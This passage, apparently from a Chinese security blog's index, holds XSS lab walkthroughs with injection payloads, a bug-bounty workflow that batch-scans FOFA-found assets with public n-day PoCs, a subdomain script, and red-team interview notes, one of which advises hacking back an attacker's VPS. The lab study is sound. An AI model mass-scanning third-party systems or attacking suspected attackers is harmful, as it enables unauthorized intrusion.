-<td align="center"><a href="http://security.pingan.com/submit">http://security.pingan.com/submit</a></td>
-</tr>
-<tr>
-<td align="center">去哪儿安全应急响应中心</td>
-<td align="center"><a href="https://security.qunar.com/report.php">https://security.qunar.com/report.php</a></td>
-</tr>
-<tr>
-<td align="center">融360安全应急响应中心</td>
-<td align="center"><a href="https://security.rong360.com/#/leak/add">https://security.rong360.com/#/leak/add</a></td>
-</tr>
-<tr>
-<td align="center">知道创宇安全应急响应中心</td>
-<td align="center"><a href="https://www.seebug.org/">https://www.seebug.org/</a></td>
-</tr>
-<tr>
-<td align="center">新浪安全应急响应中心</td>
-<td align="center"><a href="http://sec.sina.com.cn/">http://sec.sina.com.cn/</a></td>
-</tr>
-<tr>
-<td align="center">苏宁安全应急响应中心</td>
-<td align="center"><a href="https://security.suning.com/">https://security.suning.com/</a></td>
-</tr>
-<tr>
-<td align="center">途牛安全应急响应中心</td>
-<td align="center"><a href="http://sec.tuniu.com/">http://sec.tuniu.com/</a></td>
-</tr>
-<tr>
-<td align="center">T3出行安全应急响应中心</td>
-<td align="center"><a href="https://security.t3go.cn/">https://security.t3go.cn/</a></td>
-</tr>
-<tr>
-<td align="center">唯品会安全应急响应中心</td>
-<td align="center"><a href="https://sec.vip.com/">https://sec.vip.com/</a></td>
-</tr>
-<tr>
-<td align="center">vivo安全应急响应中心</td>
-<td align="center"><a href="https://security.vivo.com.cn/#/bugsubmit">https://security.vivo.com.cn/#/bugsubmit</a></td>
-</tr>
-<tr>
-<td align="center">挖财安全应急响应中心</td>
-<td align="center"><a href="https://sec.wacai.com/">https://sec.wacai.com/</a></td>
-</tr>
-<tr>
-<td align="center">微博安全应急响应中心</td>
-<td align="center"><a href="http://wsrc.weibo.com/leak_module_view">http://wsrc.weibo.com/leak_module_view</a></td>
-</tr>
-<tr>
-<td align="center">微众银行安全应急响应中心</td>
-<td align="center"><a href="https://security.webank.com/report/add">https://security.webank.com/report/add</a></td>
-</tr>
-<tr>
-<td align="center">完美世界安全应急响应中心</td>
-<td align="center"><a href="http://security.wanmei.com/">http://security.wanmei.com/</a></td>
-</tr>
-<tr>
-<td align="center">小米安全中心</td>
-<td align="center"><a href="https://sec.xiaomi.com/submit">https://sec.xiaomi.com/submit</a></td>
-</tr>
-<tr>
-<td align="center">小赢安全应急响应中心</td>
-<td align="center"><a href="https://security.xiaoying.com/user.php?m=user&c=post&a=add">https://security.xiaoying.com/user.php?m=user&amp;c=post&amp;a=add</a></td>
-</tr>
-<tr>
-<td align="center">喜马拉雅安全应急响应中心</td>
-<td align="center"><a href="https://security.ximalaya.com/">https://security.ximalaya.com/</a></td>
-</tr>
-<tr>
-<td align="center">携程安全应急响应中心</td>
-<td align="center"><a href="https://sec.ctrip.com/report">https://sec.ctrip.com/report</a></td>
-</tr>
-<tr>
-<td align="center">讯飞安全应急响应中心</td>
-<td align="center"><a href="https://security.iflytek.com/user.php/post/add">https://security.iflytek.com/user.php/post/add</a></td>
-</tr>
-<tr>
-<td align="center">有赞安全应急响应中心</td>
-<td align="center"><a href="https://src.youzan.com/">https://src.youzan.com/</a></td>
-</tr>
-<tr>
-<td align="center">银联安全应急响应中心</td>
-<td align="center"><a href="https://security.unionpay.com/">https://security.unionpay.com/</a></td>
-</tr>
-<tr>
-<td align="center">宜信安全应急响应中心</td>
-<td align="center"><a href="https://security.creditease.cn/bugReport.html">https://security.creditease.cn/bugReport.html</a></td>
-</tr>
-<tr>
-<td align="center">智联招聘安全应急响应中心</td>
-<td align="center"><a href="https://src.zhaopin.com/#/submitvul">https://src.zhaopin.com/#/submitvul</a></td>
-</tr>
-<tr>
-<td align="center">中通安全应急响应中心</td>
-<td align="center"><a href="https://sec.zto.com/">https://sec.zto.com/</a></td>
-</tr>
-<tr>
-<td align="center">猪八戒网安全应急响应中心</td>
-<td align="center"><a href="https://sec.zbj.com/">https://sec.zbj.com/</a></td>
-</tr>
-<tr>
-<td align="center">自如安全应急响应中心</td>
-<td align="center"><a href="https://zrsecurity.ziroom.com/">https://zrsecurity.ziroom.com/</a></td>
-</tr>
-</tbody></table>
-<h1 id="OWASP-TOP10"><a href="#OWASP-TOP10" class="headerlink" title="OWASP TOP10"></a>OWASP TOP10</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="Reflected-XSS-into-HTML-context-with-nothing-encoded"><a href="#Reflected-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Reflected XSS into HTML context with nothing encoded"></a>Reflected XSS into HTML context with nothing encoded</h3><ol>
-<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125160537916.png" alt="image-20251125160537916"></p>
-</li>
-<li><p>尝试闭合包裹的标签：<code>&lt;/h1&gt;&lt;u&gt;yyds&lt;/u&gt;</code>。尝试闭合h1标签，并且看看能不能解析输入的标签（为啥不直接写script，因为在实战过程中，script大概率会被过滤，所以先尝试冷门标签，防止因为标签过滤导致测试失败）。</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125161021613.png" alt="image-20251125161021613"></p>
-</li>
-<li><p>至此，浏览器成功解析用户输入的标签，xss漏洞呈现。构造弹框，通过BurpSuite靶场要求：<code>&lt;/h1&gt;&lt;script&gt;alert(111);&lt;/script&gt;</code></p>
-</li>
-</ol>
-<h3 id="Stored-XSS-into-HTML-context-with-nothing-encoded"><a href="#Stored-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Stored XSS into HTML context with nothing encoded"></a>Stored XSS into HTML context with nothing encoded</h3><ol>
-<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125162158840.png" alt="image-20251125162158840"></p>
-</li>
-<li><p>尝试闭合包裹的标签：<code>&lt;/p&gt;&lt;u&gt;yyds&lt;/u&gt;</code>。尝试闭合p标签，并且看看能不能解析输入的标签（为啥不直接写script，因为在实战过程中，script大概率会被过滤，所以先尝试冷门标签，防止因为标签过滤导致测试失败）。在这里，咱们可以发现：yyds1的位置被过滤了，没有解析成标签；但是，yyds2的位置解析成功。</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125162421502.png" alt="image-20251125162421502"></p>
-</li>
-<li><p>至此，浏览器成功解析用户输入的标签，xss漏洞呈现。构造弹框，通过BurpSuite靶场要求：<code>&lt;/p&gt;&lt;script&gt;alert(111);&lt;/script&gt;</code></p>
-</li>
-</ol>
-<h3 id="DOM-XSS-in-document-write-sink-using-source-location-search"><a href="#DOM-XSS-in-document-write-sink-using-source-location-search" class="headerlink" title="DOM XSS in document.write sink using source location.search"></a>DOM XSS in document.write sink using source location.search</h3><ol>
-<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125162932730.png" alt="image-20251125162932730"></p>
-</li>
-<li><p>尝试闭合包裹的标签：<code>&lt;/h1&gt;&lt;u&gt;yyds&lt;/u&gt;</code>。尝试闭合h1标签，并且看看能不能解析输入的标签（为啥不直接写script，因为在实战过程中，script大概率会被过滤，所以先尝试冷门标签，防止因为标签过滤导致测试失败）。在这里，咱们可以发现：h1标签的位置被过滤了，没有解析成标签；可以尝试闭合img标签中的属性，然后再拼接onload属性触发js代码执行, <code>&quot;onload=&quot;alert(111)</code></p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125200407768.png" alt="image-20251125200407768"></p>
-</li>
-</ol>
-<h3 id="DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="DOM XSS in jQuery anchor href attribute sink using location.search source"></a>DOM XSS in jQuery anchor href attribute sink using location.search source</h3><ol>
-<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置。但是我们发现，输入的yyds并没有在当前页面中进行回显，需要在burp里面分析一下数据包。</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125201431110.png" alt="image-20251125201431110"></p>
-</li>
-<li><p>通过插件HaE，以及配置的xss规则，我们发现了数据包中可能存在xss漏洞的一些代码。然后在数据包里面搜索xss的规则（没办法，插件没有具体标明匹配到了哪条规则，需要手工确认）</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125201822160.png" alt="image-20251125201822160"></p>
-</li>
-<li><p>通过分析代码，我们知道脚本会从url中获取returnPath这个参数值，并且把它放到id为backLink这个标签中的href属性中，所以我们可以尝试直接写js代码，因为浏览器可以直接解析href属性中的js代码。<code>javascript:alert(&#39;XSS&#39;)</code></p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125202335789.png" alt="image-20251125202335789"></p>
-</li>
-</ol>
-<h3 id="Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><a href="#Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded" class="headerlink" title="Reflected XSS into attribute with angle brackets HTML-encoded"></a>Reflected XSS into attribute with angle brackets HTML-encoded</h3><ol>
-<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置。</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125203134544.png" alt="image-20251125203134544"></p>
-</li>
-<li><p>尝试闭合h1标签，但发现尖括号被过滤。尝试第二个位置——闭合属性的双引号。在input标签中，onclick属性中的js代码可以被浏览器直接解析。<code>&quot; onclick=&quot;alert(111)</code></p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125203425327.png" alt="image-20251125203425327"></p>
-</li>
-</ol>
-<h3 id="Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><a href="#Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded" class="headerlink" title="Reflected XSS into a JavaScript string with angle brackets HTML encoded"></a>Reflected XSS into a JavaScript string with angle brackets HTML encoded</h3><ol>
-<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置。</p>
-</li>
-<li><p>前面几个经验可以知道，出现在标签里面的内容，一般都会过滤见括号，所以我们直接尝试的闭合属性中的双引号，也就是这里img标签中的src属性。<code>&quot; onload=&quot;alert(111)</code>，进一步发现，没有弹窗，查看源代码双引号被转义了，浏览器解析不了。</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125204157721.png" alt="image-20251125204157721"></p>
-</li>
-<li><p>进一步分析script标签中的代码，不难发现，用户的输入被放到了js代码中，并用一个searchTerms变量进行接收，我们可以尝试逃逸出这里的单引号。但是，需要保证js语法的正确性，浏览器才会正确的执行js代码。构造payload：<code>&#39; + alert(111) + &#39;</code>，最终会变成<code>var searchTerms = &#39;&#39; + alert(111) + &#39;&#39;</code>这样一个运算表达式。而alert(111)在浏览器上会被执行，并且返回undefined，所以，最终的运算结果是searchTerms&#x3D;NaN。</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125210401432.png" alt="image-20251125210401432"></p>
-</li>
-</ol>
-<h3 id="Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><a href="#Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded" class="headerlink" title="Stored XSS into anchor href attribute with double quotes HTML-encoded"></a>Stored XSS into anchor href attribute with double quotes HTML-encoded</h3><ol>
-<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置（一共会出现在四个位置，我之前测试了一些，所显示为8个）。</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125211832154.png" alt="image-20251125211832154"></p>
-</li>
-<li><p>第四个位置出现在属性里面，所以先直接对它进行测试。由于没有其他字符串拼接到payload，而是直接出现在href属性里，并且href属性中可以支持直接写js代码，所以payload：<code>javascript:alert(222)</code></p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125212229168.png" alt="image-20251125212229168"></p>
-</li>
-</ol>
-<h3 id="DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="DOM XSS in jQuery selector sink using a hashchange event"></a>DOM XSS in jQuery selector sink using a hashchange event</h3><ol>
-<li><p>见框就插：在输入框里面输入关键字，然后看源码中关键字出现的位置。</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125220214782.png" alt="image-20251125220214782"></p>
-</li>
-<li><p>经过测试，输入的内容会出现在两个位置，且都是p标签中，对尖括号还进行了实体化。进行不下去，查看burp数据包，发现Function关键字，可能会导致xss，进一步分析Function中的代码。我可以了解到，它会监视浏览器地址栏中#后面的内容变化，如果发生了改变，那么就会和其他内容放到jQuery的一个选择器里面，即$()。问题就出现在这个选择器上，当选择器里面出现了尖括号，jQuery就会把它视作HTML标签进行实例化。</p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125220748739.png" alt="image-20251125220748739"></p>
-</li>
-<li><p>所以，我们可以直接在URL地址栏中，拼接payload：<code>/#&lt;img src=x onerror=alert(1)&gt;</code></p>
-<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251125221537741.png" alt="image-20251125221537741"></p>
-</li>
-<li><p>为什么使用&lt;script&gt;标签没有生效呢</p>
-<ul>
-<li>jQuery的$()选择器在实例化DOM节点的时候，方式类似于innerHTML，而这种方式动态生成的js代码在浏览器中不会立即生效，需要二次刷新才能够进行触发；</li>
-<li>而img标签被实例化成DOM节点之后，js代码是通过onerror这个事件处理器进行执行的，即一旦实例化即刻生效。这种标签和属性还有很多，比如&lt;svg onload&gt;、&lt;iframe onload&gt;……</li>
-</ul>
-</li>
-</ol>
-<h3 id="DOM-AngularJS"><a href="#DOM-AngularJS" class="headerlink" title="DOM-AngularJS"></a>DOM-AngularJS</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. AngularJs是一个前端框架，支持`&#123;&#123;&#125;&#125;`模板表达式语法；</span><br><span class="line">2. AngularJS会扫描`ng-app`元素下的内容，如果遇到了`&#123;&#123;&#125;&#125;`，就会当成模板表达式进行执行；</span><br><span class="line">3. 由于框架的安全机制限制，没有办法直接支持&lt;script&gt;标签以及js函数。经过绕过之后，payload一般为：&#123;&#123;$on.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">4. 靶场：https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression</span><br><span class="line">5. Solution：https://blog.csdn.net/m0_65361643/article/details/151396393</span><br></pre></td></tr></table></figure>
-
-<h1 id="资产测绘"><a href="#资产测绘" class="headerlink" title="资产测绘"></a>资产测绘</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url: fofa.icu  fofa.info</span><br><span class="line">query: country=&quot;CN&quot; &amp;&amp; (host=&quot;.com&quot; || host=&quot;.cn&quot;) &amp;&amp; </span><br></pre></td></tr></table></figure>
-
-<h1 id="企业背调"><a href="#企业背调" class="headerlink" title="企业背调"></a>企业背调</h1><ol>
-<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
-<li>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></li>
-<li>SEO权重：<a href="https://github.com/Potato-py/ipInfoSearch">https://github.com/Potato-py/ipInfoSearch</a></li>
-</ol>
-<h1 id="SRC平台"><a href="#SRC平台" class="headerlink" title="SRC平台"></a>SRC平台</h1><ol>
-<li>权重为0：漏洞盒子-公益SRC</li>
-<li>有权重：补天</li>
-<li>edu.cn：教育SRC</li>
-<li>大厂：专属SRC</li>
-</ol>
-<h1 id="快速出洞"><a href="#快速出洞" class="headerlink" title="快速出洞"></a>快速出洞</h1><h3 id="通过Nday找目标"><a href="#通过Nday找目标" class="headerlink" title="通过Nday找目标"></a>通过Nday找目标</h3><p>在nuclei poc的收集平台上<a href="https://github.com/adysec/nuclei_poc%E4%BB%A5%E6%97%B6%E9%97%B4%E9%A1%BA%E5%BA%8F%E5%80%92%E6%8E%A8%E6%89%BE%E6%9C%80%E6%96%B0%E7%9A%84poc">https://github.com/adysec/nuclei_poc以时间顺序倒推找最新的poc</a>  &#x3D;&#x3D;&gt;  然后通过FOFA匹配资产  &#x3D;&#x3D;&gt;  VPS批量漏洞+云端上传  &#x3D;&#x3D;&gt;  导出结果+ipinfoSearch批量查权重  &#x3D;&#x3D;&gt;  企查查&#x2F;爱企查做背调  &#x3D;&#x3D;&gt;  有权重交补天，没权重交盒子  &#x3D;&#x3D;&gt;  如果提示漏洞标题存在，加上一些特殊符号进行绕过。</p>
-<ol>
-<li>URL格式处理：<a href="http://tools.sbbbb.cn/url-ip/">URL &amp; IP 在线处理工具</a></li>
-</ol>
-<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ol>
-<li>大厂边缘资产、非金融</li>
-<li>漏洞处置规则</li>
-</ol>
-<h1 id="Day01-字节SRC"><a href="#Day01-字节SRC" class="headerlink" title="Day01-字节SRC"></a>Day01-字节SRC</h1><blockquote>
-<ol>
-<li>SRC不强求漏洞利用，只要是漏洞就可以。当然，能够利用造成更大的危害肯定是更好</li>
-<li>SRC中常见漏洞：DOM-XSS、SSRF、逻辑漏洞、未授权访问</li>
-</ol>
-</blockquote>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol>
-<li><p>资产扩充——多个网络空间搜索引擎联合搜索：主域名、favicon、相同证书、C段</p>
-</li>
-<li><p>子域名提取脚本</p>
- <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_subdomains</span>(<span class="params">file_path, target_domain, include_main=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从文件中提取指定域名下的子域名</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        file_path: 包含URL的文件路径</span></span><br><span class="line"><span class="string">        target_domain: 目标主域名(如example.com)</span></span><br><span class="line"><span class="string">        include_main: 是否包含主域名本身</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        去重后的子域名列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 编译正则表达式，用于匹配目标域名及其子域名</span></span><br><span class="line">    <span class="comment"># 支持带端口、路径等情况</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(</span><br><span class="line">        <span class="string">r&#x27;(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]&#123;0,61&#125;[a-zA-Z0-9])?\.)*?&#x27;</span> + </span><br><span class="line">        re.escape(target_domain) + </span><br><span class="line">        <span class="string">r&#x27;(?::\d+)?(?:/.*)?$&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    subdomains = <span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                line = line.strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 尝试使用urlparse解析</span></span><br><span class="line">                parsed = urlparse(line)</span><br><span class="line">                <span class="keyword">if</span> parsed.netloc:  <span class="comment"># 有网络位置部分</span></span><br><span class="line">                    domain = parsed.netloc</span><br><span class="line">                    <span class="comment"># 去除端口</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> domain:</span><br><span class="line">                        domain = domain.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># 没有协议部分，直接处理</span></span><br><span class="line">                    domain = line.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 检查是否匹配目标域名</span></span><br><span class="line">                <span class="keyword">if</span> pattern.<span class="keyword">match</span>(domain):</span><br><span class="line">                    <span class="comment"># 提取完整域名(包含子域名)</span></span><br><span class="line">                    full_domain = domain</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 确保不包含端口信息</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> full_domain:</span><br><span class="line">                        full_domain = full_domain.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 检查是否为主域名本身</span></span><br><span class="line">                    <span class="keyword">if</span> full_domain == target_domain:</span><br><span class="line">                        <span class="keyword">if</span> include_main:</span><br><span class="line">                            subdomains.add(full_domain)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># 确认是目标域名的子域名</span></span><br><span class="line">                        <span class="keyword">if</span> full_domain.endswith(<span class="string">&#x27;.&#x27;</span> + target_domain):</span><br><span class="line">                            subdomains.add(full_domain)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 文件 &#x27;<span class="subst">&#123;file_path&#125;</span>&#x27; 不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;处理文件时出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 按长度排序，便于阅读</span></span><br><span class="line">    sorted_subdomains = <span class="built_in">sorted</span>(subdomains, key=<span class="keyword">lambda</span> x: (<span class="built_in">len</span>(x.split(<span class="string">&#x27;.&#x27;</span>)), x))</span><br><span class="line">    <span class="keyword">return</span> sorted_subdomains</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;提取指定域名下的子域名&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;包含URL的文件路径&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;domain&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;目标主域名(如example.com)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--include-main&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&#x27;是否包含主域名本身&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;输出结果到文件&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在从 <span class="subst">&#123;args.file&#125;</span> 中提取 <span class="subst">&#123;args.domain&#125;</span> 的子域名...&quot;</span>)</span><br><span class="line">    subdomains = extract_subdomains(args.file, args.domain, args.include_main)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> subdomains:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n共找到 <span class="subst">&#123;<span class="built_in">len</span>(subdomains)&#125;</span> 个独特的子域名:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">            <span class="built_in">print</span>(subdomain)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> args.output:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">                    f.write(subdomain + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n结果已保存到 <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n未找到 <span class="subst">&#123;args.domain&#125;</span> 的子域名&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <categories>
-        <category>SRC</category>
-      </categories>
-      <tags>
-        <tag>SRC挖掘思路</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>红队面试</title>
-    <url>/%E5%85%AB%E8%82%A1%E6%96%87.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
-
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
-<li><p>常见安全设备之间的区别</p>
- <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">WAF：专门对WEB进行防护的应用程序，对http流量进行特征检测，并及时拦截、封禁IP等措施；</span><br><span class="line">防火墙：主要在三层、四层进行过滤，根据规则进行拦截或者放行；</span><br><span class="line">IDS: 对交换机镜像过来的流量进行检测，根据特征进行匹配然后告警，一般旁路部署；</span><br><span class="line">IPS：在检测流量的基础之上，还可以拦截危险的流量，主要部署在出入口的一些地方，形成一条串行链路；</span><br><span class="line">态势感知：整个网络进行的监控，实时汇报攻击源、攻击事件，甚至还可以预测提示下一步的攻击方向，提前防御；</span><br><span class="line">蜜罐：故意部署的带有漏洞的一些系统，主要套取攻击者的一些攻击手法、工具等等，当然了，在一定程度上起到了防御作用；根据交互式程度一般分为低中高三种蜜罐，最常用的开源蜜罐一般是hfishing；</span><br><span class="line">威胁情报：对攻击事件进行的总结，形成的报告，最有意义/最具有代表性的要看里面的IOC（攻击的特征）。来源：微步在线、XXX威胁情报中心，在云沙箱里面运行可以程序，根据特征/IOC进行分析；</span><br><span class="line">EDR：根据特征库、行为对终端进行监控、防护、高危行为的组织。</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>怎么判断设备是不是误报</p>
- <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 看来源IP：国内的/国外的、内部来源/外部来源、访问频率、有没有其他攻击行为的记录（安全设备&amp;威胁情报）；</span><br><span class="line">2. 人工分析流量特征：请求里面有没有一些比较敏感的流量特征/敏感的函数名关键字、响应内容是不是包含了敏感信息/命令执行的结果</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>windows入侵排查</p>
- <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 恶意账号：net user/net localgroup/注册表找影子账户/在事件管理器的widnows安全日志中，找出登录的用户；</span><br><span class="line">2. netstat -ano获取外部链接ip，然后到威胁情报中心进行判断</span><br><span class="line">3. 启动项排查、计划任务</span><br><span class="line">4. everything查看新增的一些文件，重点筛选exe/vbs/dll，通过云沙箱进行在线判断</span><br><span class="line">5. 日志分析4625找失败的日志、4672管理员登录、4688找新创建的日志</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Linux入侵排查</p>
- <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 账号安全：列出所有特权用户、sudo用户、远程登录用户；历史命令，可以在/etc/profile文件中配置记录命令时，同时记录IP地址</span><br><span class="line">2. ss -tulpna找出所有网络连接和对应的进程</span><br><span class="line">3. 启动项排查（/etc/rc.d/rc*.d/）、定时任务（/var/spool/cron/ /etc/crontab）</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>溯源反制</p>
- <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 确认攻击事件之后，通过系统日志、网络流量定位到攻击者ip；</span><br><span class="line">2. 通过一些在线网站ip138、站长之家反查域名，尽量找到攻击者的个人信息；</span><br><span class="line">3. 反打攻击者ip，找到vps上遗留的个人数据，查看登录日志，找出上一次的登录ip；</span><br><span class="line">4. 部署蜜罐，套取攻击者的工具信息、字典信息、攻击的目标等攻击手法</span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <categories>
-        <category>红队</category>
-      </categories>
-      <tags>
-        <tag>面试</tag>
-        <tag>八股文</tag>
-        <tag>面经</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SpringBoot入门</title>
-    <url>/SpringBootDev.html</url>
